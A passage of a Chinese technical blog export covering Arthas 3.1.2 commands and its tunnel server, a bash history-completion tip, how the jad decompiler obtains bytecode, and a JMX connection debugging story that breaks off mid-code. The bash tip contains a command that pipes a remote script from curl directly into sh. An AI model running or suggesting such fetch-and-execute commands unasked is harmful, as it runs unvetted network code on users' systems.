<h3 id="vmoption命令"><a href="#vmoption命令" class="headerlink" title="vmoption命令"></a>vmoption命令</h3><blockquote>
<p>查看，更新VM诊断相关的参数</p>
</blockquote>
<ul>
<li><a href="https://alibaba.github.io/arthas/vmoption.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/vmoption.html</a></li>
</ul>
<h4 id="查看所有的option"><a href="#查看所有的option" class="headerlink" title="查看所有的option"></a>查看所有的option</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[arthas@56963]$ vmoption</span><br><span class="line"> KEY                    VALUE                   ORIGIN                 WRITEABLE</span><br><span class="line">---------------------------------------------------------------------------------------------</span><br><span class="line"> HeapDumpBeforeFullGC   <span class="literal">false</span>                   DEFAULT                <span class="literal">true</span></span><br><span class="line"> HeapDumpAfterFullGC    <span class="literal">false</span>                   DEFAULT                <span class="literal">true</span></span><br><span class="line"> HeapDumpOnOutOfMemory  <span class="literal">false</span>                   DEFAULT                <span class="literal">true</span></span><br><span class="line"> Error</span><br><span class="line"> HeapDumpPath                                   DEFAULT                <span class="literal">true</span></span><br><span class="line"> CMSAbortablePrecleanW  100                     DEFAULT                <span class="literal">true</span></span><br><span class="line"> aitMillis</span><br><span class="line"> CMSWaitDuration        2000                    DEFAULT                <span class="literal">true</span></span><br><span class="line"> CMSTriggerInterval     -1                      DEFAULT                <span class="literal">true</span></span><br><span class="line"> PrintGC                <span class="literal">false</span>                   DEFAULT                <span class="literal">true</span></span><br><span class="line"> PrintGCDetails         <span class="literal">true</span>                    MANAGEMENT             <span class="literal">true</span></span><br><span class="line"> PrintGCDateStamps      <span class="literal">false</span>                   DEFAULT                <span class="literal">true</span></span><br><span class="line"> PrintGCTimeStamps      <span class="literal">false</span>                   DEFAULT                <span class="literal">true</span></span><br><span class="line"> PrintGCID              <span class="literal">false</span>                   DEFAULT                <span class="literal">true</span></span><br><span class="line"> PrintClassHistogramBe  <span class="literal">false</span>                   DEFAULT                <span class="literal">true</span></span><br><span class="line"> foreFullGC</span><br><span class="line"> PrintClassHistogramAf  <span class="literal">false</span>                   DEFAULT                <span class="literal">true</span></span><br><span class="line"> terFullGC</span><br><span class="line"> PrintClassHistogram    <span class="literal">false</span>                   DEFAULT                <span class="literal">true</span></span><br><span class="line"> MinHeapFreeRatio       0                       DEFAULT                <span class="literal">true</span></span><br><span class="line"> MaxHeapFreeRatio       100                     DEFAULT                <span class="literal">true</span></span><br><span class="line"> PrintConcurrentLocks   <span class="literal">false</span>                   DEFAULT                <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h4 id="查看指定的option"><a href="#查看指定的option" class="headerlink" title="查看指定的option"></a>查看指定的option</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[arthas@56963]$ vmoption PrintGCDetails</span><br><span class="line"> KEY                    VALUE                   ORIGIN                 WRITEABLE</span><br><span class="line">---------------------------------------------------------------------------------------------</span><br><span class="line"> PrintGCDetails         <span class="literal">false</span>                   MANAGEMENT             <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h4 id="更新指定的option"><a href="#更新指定的option" class="headerlink" title="更新指定的option"></a>更新指定的option</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[arthas@56963]$ vmoption PrintGCDetails <span class="literal">true</span></span><br><span class="line">Successfully updated the vm option.</span><br><span class="line">PrintGCDetails=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h3 id="stop命令"><a href="#stop命令" class="headerlink" title="stop命令"></a>stop命令</h3><p>之前有用户吐槽，不小心退出Arthas console之后，<code>shutdown</code>会关闭系统，因此增加了<code>stop</code>命令来退出arthas，功能和<code>shutdown</code>命令一致。</p>
<h2 id="通过tunnel-server连接不同网络的arthas"><a href="#通过tunnel-server连接不同网络的arthas" class="headerlink" title="通过tunnel server连接不同网络的arthas"></a>通过tunnel server连接不同网络的arthas</h2><ul>
<li><a href="https://alibaba.github.io/arthas/web-console.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/web-console.html</a></li>
</ul>
<p>在新版本里，增加了arthas tunnel server的功能，用户可以通过tunnel server很方便连接不同网络里的arthas agent，适合做统一管控。</p>
<h3 id="启动arthas时连接到tunnel-server"><a href="#启动arthas时连接到tunnel-server" class="headerlink" title="启动arthas时连接到tunnel server"></a>启动arthas时连接到tunnel server</h3><p>在启动arthas，可以传递<code>--tunnel-server</code>参数，比如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">as.sh --tunnel-server <span class="string">'ws://47.75.156.201:7777/ws'</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>目前<code>47.75.156.201</code>是一个测试服务器，用户可以自己搭建arthas tunnel server</p>
</blockquote>
<ul>
<li>如果有特殊需求，可以通过<code>--agent-id</code>参数里指定agentId。默认情况下，会生成随机ID。</li>
</ul>
<p>attach成功之后，会打印出agentId，比如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">  ,---.  ,------. ,--------.,--.  ,--.  ,---.   ,---.</span><br><span class="line"> /  O  \ |  .--. <span class="string">''</span>--.  .--<span class="string">'|  '</span>--<span class="string">'  | /  O  \ '</span>   .-<span class="string">'</span></span><br><span class="line"><span class="string">|  .-.  ||  '</span>--<span class="string">'.'</span>   |  |   |  .--.  ||  .-.  |`.  `-.</span><br><span class="line">|  | |  ||  |\  \    |  |   |  |  |  ||  | |  |.-<span class="string">'    |</span></span><br><span class="line"><span class="string">`--'</span> `--<span class="string">'`--'</span> <span class="string">'--'</span>   `--<span class="string">'   `--'</span>  `--<span class="string">'`--'</span> `--<span class="string">'`-----'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wiki      https://alibaba.github.io/arthas</span><br><span class="line">tutorials https://alibaba.github.io/arthas/arthas-tutorials</span><br><span class="line">version   3.1.2</span><br><span class="line">pid       86183</span><br><span class="line">time      2019-08-30 15:40:53</span><br><span class="line">id        URJZ5L48RPBR2ALI5K4V</span><br></pre></td></tr></table></figure>
<p>如果是启动时没有连接到 tunnel server，也可以在后续自动重连成功之后，通过 session命令来获取 agentId：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[arthas@86183]$ session</span><br><span class="line"> Name           Value</span><br><span class="line">-----------------------------------------------------</span><br><span class="line"> JAVA_PID       86183</span><br><span class="line"> SESSION_ID     f7273eb5-e7b0-4a00-bc5b-3fe55d741882</span><br><span class="line"> AGENT_ID       URJZ5L48RPBR2ALI5K4V</span><br><span class="line"> TUNNEL_SERVER  ws://47.75.156.201:7777/ws</span><br></pre></td></tr></table></figure>
<p>以上面的为例，在浏览器里访问 <a href="http://47.75.156.201:8080/" target="_blank" rel="noopener">http://47.75.156.201:8080/</a> ，输入 <code>agentId</code>，就可以连接到本机上的arthas了。</p>
<p><img src="https://alibaba.github.io/arthas/_images/arthas-tunnel-server.png" alt></p>
<h4 id="Arthas-tunnel-server的工作原理"><a href="#Arthas-tunnel-server的工作原理" class="headerlink" title="Arthas tunnel server的工作原理"></a>Arthas tunnel server的工作原理</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">browser &lt;-&gt; arthas tunnel server &lt;-&gt; arthas tunnel client &lt;-&gt; arthas agent</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/alibaba/arthas/blob/master/tunnel-server/README.md" target="_blank" rel="noopener">https://github.com/alibaba/arthas/blob/master/tunnel-server/README.md</a></p>
<h2 id="易用性持续提升"><a href="#易用性持续提升" class="headerlink" title="易用性持续提升"></a>易用性持续提升</h2><ul>
<li><p>提示符修改为<code>arthas@pid</code>形式，用户可以确定当前进程ID，避免多个进程时误操作</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[arthas@86183]$ help</span><br></pre></td></tr></table></figure>
</li>
<li><p>增加<code>ctrl + k</code>清屏快捷键</p>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总之，<code>3.1.2</code>版本的Arthas新增加了<code>logger/heapdump/vmoption/stop</code>命令，增加了tunnel server，方便统一管控。另外还有一些bug修复等，可以参考</p>
<ul>
<li>Release Note: <a href="https://github.com/alibaba/arthas/releases/tag/3.1.2" target="_blank" rel="noopener">https://github.com/alibaba/arthas/releases/tag/3.1.2</a></li>
</ul>
<p>最后，Arthas的在线教程考虑重新组织，欢迎大家参与，提出建议：</p>
<ul>
<li><a href="https://github.com/alibaba/arthas/issues/847" target="_blank" rel="noopener">https://github.com/alibaba/arthas/issues/847</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>arthas</tag>
        <tag>logger</tag>
      </tags>
  </entry>
  <entry>
    <title>在bash高效匹配历史命令的技巧</title>
    <url>/bash_completion_tips/</url>
    <content><![CDATA[<h2 id="在bash里补全历史命令"><a href="#在bash里补全历史命令" class="headerlink" title="在bash里补全历史命令"></a>在bash里补全历史命令</h2><p>本文介绍本人觉得最好用的bash配置技巧，一次配置，每天受益。</p>
<p>在bash里，最常见的搜索历史命令的办法是<code>ctrl + r</code>，但是这个步骤太多，比较麻烦。</p>
<p>下面介绍一种非常快捷的补全方式。</p>
<p>执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -L http://hengyunabc.github.io/bash_completion_install.sh | sh</span><br><span class="line"><span class="built_in">bind</span> -f  ~/.inputrc</span><br></pre></td></tr></table></figure>
<p>这样子，先输入部分命令，再按键盘的<code>Up/Down</code>就可以自动补全出历史命令了。</p>
<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>实际上给<code>~/.inputrc</code>文件添加了下面的内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">"\e[A"</span>: <span class="built_in">history</span>-search-backward</span><br><span class="line"><span class="string">"\e[B"</span>: <span class="built_in">history</span>-search-forward</span><br><span class="line"><span class="built_in">set</span> show-all-if-ambiguous on</span><br><span class="line"><span class="built_in">set</span> completion-ignore-case on</span><br></pre></td></tr></table></figure>
<p>前面两行自然是绑定了快捷键，后面两行是什么意思呢？</p>
<p><code>show-all-if-ambiguous</code> 是指tab补全时，按一次tab就会把最长匹配的自动补全。具体参考 <a href="https://stackoverflow.com/a/42193784" target="_blank" rel="noopener">https://stackoverflow.com/a/42193784</a></p>
<p><code>completion-ignore-case</code> 是指tab补全时，忽略大小写，这点也非常方便。</p>
<blockquote>
<p>注意，在修改完<code>~/.inputrc</code>文件，要显式执行<code>bind -f  ~/.inputrc</code>才会生效。</p>
</blockquote>
<p>题外话，在<code>arthas</code>里也支持了<code>Up/Down</code>自动补全历史命令这个特性，所以在<code>arthas</code>里自动补全历史命令非常的方便。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>bash</tag>
      </tags>
  </entry>
  <entry>
    <title>Arthas源码分析--jad反编译原理</title>
    <url>/arthas-jad/</url>
    <content><![CDATA[<p>Arthas是阿里巴巴开源的Java应用诊断利器，本文介绍Arthas 3.1.1版本里<code>jad</code>命令的实现原理。</p>
<ul>
<li><a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">https://github.com/alibaba/arthas</a></li>
</ul>
<h2 id="jad命令介绍"><a href="#jad命令介绍" class="headerlink" title="jad命令介绍"></a><code>jad</code>命令介绍</h2><ul>
<li><a href="https://alibaba.github.io/arthas/jad.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/jad.html</a></li>
</ul>
<p>jad即java decompiler，把JVM已加载类的字节码反编译成Java代码。比如反编译<code>String</code>类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ jad java.lang.String</span><br><span class="line"> </span><br><span class="line">ClassLoader:</span><br><span class="line"> </span><br><span class="line">Location:</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Decompiled with CFR .</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">package</span> java.lang;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamField;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">String</span></span></span><br><span class="line"><span class="class"><span class="keyword">implements</span> <span class="title">Serializable</span>,</span></span><br><span class="line"><span class="class"><span class="title">Comparable</span>&lt;<span class="title">String</span>&gt;,</span></span><br><span class="line"><span class="class"><span class="title">CharSequence</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">char</span>[] value;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> hash;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">6849794470754667710L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ObjectStreamField[] serialPersistentFields = <span class="keyword">new</span> ObjectStreamField[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Comparator&lt;String&gt; CASE_INSENSITIVE_ORDER = <span class="keyword">new</span> CaseInsensitiveComparator();</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">String</span><span class="params">(<span class="keyword">byte</span>[] arrby, <span class="keyword">int</span> n, <span class="keyword">int</span> n2)</span> </span>&#123;</span><br><span class="line">        String.checkBounds(arrby, n, n2);</span><br><span class="line">        <span class="keyword">this</span>.value = StringCoding.decode(arrby, n, n2);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h2 id="获取到类的字节码"><a href="#获取到类的字节码" class="headerlink" title="获取到类的字节码"></a>获取到类的字节码</h2><p>反编译有两部分工作：</p>
<ol>
<li>获取到字节码</li>
<li>反编译为Java代码</li>
</ol>
<p>那么怎么从运行的JVM里获取到字节码？</p>
<p>最常见的思路是，在<code>classpaths</code>下面查找，比如 <code>ClassLoader.getResource(&quot;java/lang/String.class&quot;)</code>，但是这样子查找到的字节码不一定对。比如可能有多个冲突的jar，或者有Java Agent修改了字节码。</p>
<h2 id="ClassFileTransformer机制"><a href="#ClassFileTransformer机制" class="headerlink" title="ClassFileTransformer机制"></a>ClassFileTransformer机制</h2><p>从JDK 1.5起，有一套<code>ClassFileTransformer</code>的机制，Java Agent通过<code>Instrumentation</code>注册<code>ClassFileTransformer</code>，那么在类加载或者<code>retransform</code>时就可以回调修改字节码。</p>
<p>显然，在Arthas里，要增强的类是已经被加载的，所以它们的字节码都是在<code>retransform</code>时被修改的。<br>通过显式调用<code>Instrumentation.retransformClasses(Class&lt;?&gt;...)</code>可以触发回调。</p>
<p>Arthas里增强字节码的<code>watch</code>/<code>trace</code>/<code>stack</code>/<code>tt</code>等命令都是通过<code>ClassFileTransformer</code>来实现的。</p>
<p><code>ClassFileTransformer</code>的接口如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[]</span><br><span class="line">    transform(  ClassLoader         loader,</span><br><span class="line">                String              className,</span><br><span class="line">                Class&lt;?&gt;            classBeingRedefined,</span><br><span class="line">                ProtectionDomain    protectionDomain,</span><br><span class="line">                <span class="keyword">byte</span>[]              classfileBuffer)</span><br><span class="line">        <span class="keyword">throws</span> IllegalClassFormatException;</span><br></pre></td></tr></table></figure>
<p>看到这里，读者应该猜到<code>jad</code>是怎么获取到字节码的了：</p>
<ol>
<li>注册一个<code>ClassFileTransformer</code></li>
<li>通过<code>Instrumentation.retransformClasses</code>触发回调</li>
<li>在回调的<code>transform</code>函数里获取到字节码</li>
<li>删掉注册的<code>ClassFileTransformer</code></li>
</ol>
<h2 id="使用cfr来反编译"><a href="#使用cfr来反编译" class="headerlink" title="使用cfr来反编译"></a>使用cfr来反编译</h2><p>获取到字节码之后，怎样转换为Java代码呢？</p>
<p>以前大家使用比较多的反编译软件可能是<code>jd-gui</code>，但是它不支持JDK8的lambda语法和一些新版本JDK的特性。</p>
<p>后面比较成熟的反编译软件是<code>cfr</code>，它以前是不开源的。直到最近的<code>0.145</code>版本，作者终于开源了，可喜可贺。地址是</p>
<ul>
<li><a href="https://github.com/leibnitz27/cfr" target="_blank" rel="noopener">https://github.com/leibnitz27/cfr</a></li>
</ul>
<p>在Arthas <code>jad</code>命令里，通过调用<code>cfr</code>来完成反编译。</p>
<h2 id="jad命令的缺陷"><a href="#jad命令的缺陷" class="headerlink" title="jad命令的缺陷"></a><code>jad</code>命令的缺陷</h2><p>99%的情况下，<code>jad</code>命令dump下来的字节码是准确的，除了一些极端情况。</p>
<ol>
<li>因为JVM里注册的<code>ClassFileTransformer</code>可能有多个，那么在JVM里运行的字节码里，可能是被多个<code>ClassFileTransformer</code>处理过的。</li>
<li>触发了<code>retransformClasses</code>之后，这些注册的<code>ClassFileTransformer</code>会被依次回，上一个处理的字节码传递到下一个。<br>所以不能保证这些<code>ClassFileTransformer</code>第二次执行会返回同样的结果。</li>
<li>有可能一些<code>ClassFileTransformer</code>会被删掉，触发<code>retransformClasses</code>之后，之前的一些修改就会丢失掉。</li>
</ol>
<p>所以目前在Arthas里，如果开两个窗口，一个窗口执行<code>watch</code>/<code>tt</code>等命令，另一个窗口对这个类执行<code>jad</code>，那么可以观察到<code>watch</code>/<code>tt</code>停止了输出，实际上是因为字节码在触发了<code>retransformClasses</code>之后，<code>watch</code>/<code>tt</code>所做的修改丢失了。</p>
<h2 id="精确获取JVM内运行的java字节码的办法"><a href="#精确获取JVM内运行的java字节码的办法" class="headerlink" title="精确获取JVM内运行的java字节码的办法"></a>精确获取JVM内运行的java字节码的办法</h2><p>如果想精确获取到JVM内运行的Java字节码，可以使用这个<code>dumpclass</code>工具，它是通过<code>sa-jdi.jar</code>来实现的，保证dump下来的字节码是JVM内所运行的。</p>
<ul>
<li><a href="https://github.com/hengyunabc/dumpclass" target="_blank" rel="noopener">https://github.com/hengyunabc/dumpclass</a></li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结<code>jad</code>命令的工作原理：</p>
<ul>
<li>通过注册<code>ClassFileTransformer</code>，再触发<code>retransformClasses</code>来获取字节码</li>
<li>通过<code>cfr</code>来反编译</li>
<li><code>ClassFileTransformer</code>的方式来获取字节码有一定缺陷</li>
<li>通过<code>dumpclass</code>工具可以精确获取字节码</li>
</ul>
<p><code>jad</code>命令可以在线上快速检查运行时的代码，并且结合<code>mc</code>/<code>redefine</code>命令可以热更新代码：</p>
<ul>
<li>jad/mc/redefine线上热更新一条龙: <a href="http://hengyunabc.github.io/arthas-online-hotswap/">http://hengyunabc.github.io/arthas-online-hotswap/</a></li>
</ul>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><ul>
<li>Arthas开源：<a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">https://github.com/alibaba/arthas</a></li>
<li>dumpclass: <a href="https://github.com/hengyunabc/dumpclass" target="_blank" rel="noopener">https://github.com/hengyunabc/dumpclass</a></li>
<li><a href="https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/ClassFileTransformer.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/ClassFileTransformer.html</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>arthas</tag>
        <tag>bytecode</tag>
        <tag>jad</tag>
      </tags>
  </entry>
  <entry>
    <title>通过Heap dump排查Java JMX连接不上的问题</title>
    <url>/jmx-local-connect-problem/</url>
    <content><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>最近排查一个JMX本地连接问题，记录一下。</p>
<p>我们的启动脚本在应用启动后，会通过JMX来动态检查应用状态，那么这里就需要动态启动JMX功能了。</p>
<h3 id="动态打开Java进程的JMX端口"><a href="#动态打开Java进程的JMX端口" class="headerlink" title="动态打开Java进程的JMX端口"></a>动态打开Java进程的JMX端口</h3><ol>
<li>通过下面的代码，可以动态的让目标进程加载<code>management-agent</code></li>
<li>打开JMX功能后，通过获取<code>com.sun.management.jmxremote.localConnectorAddress</code>的Agent Property，可以获取到JMX URL</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> MBeanServerConnection <span class="title">connect</span><span class="params">(String pid)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String address = attachJmx(pid);</span><br><span class="line"></span><br><span class="line">    JMXServiceURL serviceURL = <span class="keyword">new</span> JMXServiceURL(address);</span><br><span class="line">    connector = JMXConnectorFactory.connect(serviceURL);</span><br><span class="line">    <span class="keyword">return</span> connector.getMBeanServerConnection();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">attachJmx</span><span class="params">(String pid)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        virtualmachine = VirtualMachine.attach(pid);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (AttachNotSupportedException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(e);</span><br><span class="line">    &#125;</span><br><span class="line">    String javaHome = virtualmachine.getSystemProperties().getProperty(<span class="string">"java.home"</span>);</span><br><span class="line">    String agentPath = javaHome + File.separator + <span class="string">"jre"</span> + File.separator + <span class="string">"lib"</span> + File.separator</span><br><span class="line">                       + <span class="string">"management-agent.jar"</span>;</span><br><span class="line">    File file = <span class="keyword">new</span> File(agentPath);</span><br><span class="line">    <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">        agentPath = javaHome + File.separator + <span class="string">"lib"</span> + File.separator + <span class="string">"management-agent.jar"</span>;</span><br><span class="line">        file = <span class="keyword">new</span> File(agentPath);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Management agent not found"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    agentPath = file.getCanonicalPath();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        virtualmachine.loadAgent(agentPath, <span class="string">"com.sun.management.jmxremote"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (AgentLoadException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (AgentInitializationException agentinitializationexception) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(agentinitializationexception);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Properties properties = virtualmachine.getAgentProperties();</span><br><span class="line">    String address = (String) properties.get(<span class="string">"com.sun.management.jmxremote.localConnectorAddress"</span>);</span><br><span class="line">    virtualmachine.detach();</span><br><span class="line">    <span class="keyword">return</span> address;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="为什么JMX连接会失败？"><a href="#为什么JMX连接会失败？" class="headerlink" title="为什么JMX连接会失败？"></a>为什么JMX连接会失败？</h3><p>在用上面的代码动态去连接目标进程时，抛出了下面的异常：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.rmi.ConnectException: Connection refused to host: 11.164.235.11; nested exception is:</span><br><span class="line">  java.net.ConnectException: Connection refused</span><br><span class="line">  at sun.rmi.transport.tcp.TCPEndpoint.newSocket(TCPEndpoint.java:619)</span><br><span class="line">  at sun.rmi.transport.tcp.TCPChannel.createConnection(TCPChannel.java:216)</span><br><span class="line">  at sun.rmi.transport.tcp.TCPChannel.newConnection(TCPChannel.java:202)</span><br><span class="line">  at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:130)</span><br><span class="line">  at java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod(RemoteObjectInvocationHandler.java:227)</span><br><span class="line">  at java.rmi.server.RemoteObjectInvocationHandler.invoke(RemoteObjectInvocationHandler.java:179)</span><br><span class="line">  at com.sun.proxy.$Proxy0.newClient(Unknown Source)</span><br><span class="line">  at javax.management.remote.rmi.RMIConnector.getConnection(RMIConnector.java:2430)</span><br><span class="line">  at javax.management.remote.rmi.RMIConnector.connect(RMIConnector.java:308)</span><br><span class="line">  at javax.management.remote.JMXConnectorFactory.connect(JMXConnectorFactory.java:270)</span><br><span class="line">  at javax.management.remote.JMXConnectorFactory.connect(JMXConnectorFactory.java:229)</span><br><span class="line">  at com.test.jmx.JmxLocalConnector.connect(JmxLocalConnector.java:28)</span><br><span class="line">Caused by: java.net.ConnectException: Connection refused</span><br><span class="line">  at java.net.PlainSocketImpl.socketConnect(Native Method)</span><br><span class="line">  at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350)</span><br><span class="line">  at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206)</span><br><span class="line">  at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188)</span><br><span class="line">  at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)</span><br><span class="line">  at java.net.Socket.connect(Socket.java:589)</span><br><span class="line">  at java.net.Socket.connect(Socket.java:538)</span><br><span class="line">  at java.net.Socket.&lt;init&gt;(Socket.java:434)</span><br><span class="line">  at java.net.Socket.&lt;init&gt;(Socket.java:211)</span><br><span class="line">  at sun.rmi.transport.proxy.RMIDirectSocketFactory.createSocket(RMIDirectSocketFactory.java:40)</span><br><span class="line">  at sun.rmi.transport.proxy.RMIMasterSocketFactory.createSocket(RMIMasterSocketFactory.java:148)</span><br><span class="line">  at sun.rmi.transport.tcp.TCPEndpoint.newSocket(TCPEndpoint.java:613)</span><br><span class="line">  ... 13 more</span><br></pre></td></tr></table></figure>
<ul>
<li>检查本机IP是 <code>11.164.234.171</code></li>
<li>为什么rmi连接的是一个外部的IP <code>11.164.235.11</code>？</li>
</ul>
<p>通过调试，发现<code>management-agent</code>加载成功了，<code>localConnectorAddress</code>的值是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jmx:rmi://127.0.0.1/stub/rO0ABXN9AAAAAQAlamF2YXgubWFuYWdlbWVudC5yZW1vdGUucm1pLlJNSVNlcnZlcnhyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyAC1qYXZhLnJtaS5zZXJ2ZXIuUmVtb3RlT2JqZWN0SW52b2NhdGlvbkhhbmRsZXIAAAAAAAAAAgIAAHhyABxqYXZhLnJtaS5zZXJ2ZXIuUmVtb3RlT2JqZWN002G0kQxhMx4DAAB4cHc4AAtVbmljYXN0UmVmMgAADTExLjE2NC4yMzUuMTEAAIfoCEScYyGQodFlwEdFAAABawK/zE6AAQB4</span><br></pre></td></tr></table></figure>
<p><strong>为什么显示的是<code>127.0.0.1</code>，但实际连接的是<code>11.164.235.11</code>？是不是在连接时出的问题？</strong></p>
<p>再仔细调试，发现</p>
<ol>
<li>jmx是获取到stub后的字符串</li>
<li>做base64解密，再通过<code>ObjectInputStream</code>解析</li>
<li><code>readObject</code>得到<code>RMIServer</code>对象来连接的。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//javax.management.remote.rmi.RMIConnector.findRMIServer(JMXServiceURL, Map&lt;String, Object&gt;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//--------------------------------------------------------------------</span></span><br><span class="line">    <span class="comment">// Private stuff - RMIServer creation</span></span><br><span class="line">    <span class="comment">//--------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> RMIServer <span class="title">findRMIServer</span><span class="params">(JMXServiceURL directoryURL,</span></span></span><br><span class="line"><span class="function"><span class="params">            Map&lt;String, Object&gt; environment)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> NamingException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">boolean</span> isIiop = RMIConnectorServer.isIiopURL(directoryURL,<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (isIiop) &#123;</span><br><span class="line">            <span class="comment">// Make sure java.naming.corba.orb is in the Map.</span></span><br><span class="line">            environment.put(EnvHelp.DEFAULT_ORB,resolveOrb(environment));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String path = directoryURL.getURLPath();</span><br><span class="line">        <span class="keyword">int</span> end = path.indexOf(<span class="string">';'</span>);</span><br><span class="line">        <span class="keyword">if</span> (end &lt; <span class="number">0</span>) end = path.length();</span><br><span class="line">        <span class="keyword">if</span> (path.startsWith(<span class="string">"/jndi/"</span>))</span><br><span class="line">            <span class="keyword">return</span> findRMIServerJNDI(path.substring(<span class="number">6</span>,end), environment, isIiop);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (path.startsWith(<span class="string">"/stub/"</span>))</span><br><span class="line">            <span class="keyword">return</span> findRMIServerJRMP(path.substring(<span class="number">6</span>,end), environment, isIiop);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (path.startsWith(<span class="string">"/ior/"</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!IIOPHelper.isAvailable())</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"iiop protocol not available"</span>);</span><br><span class="line">            <span 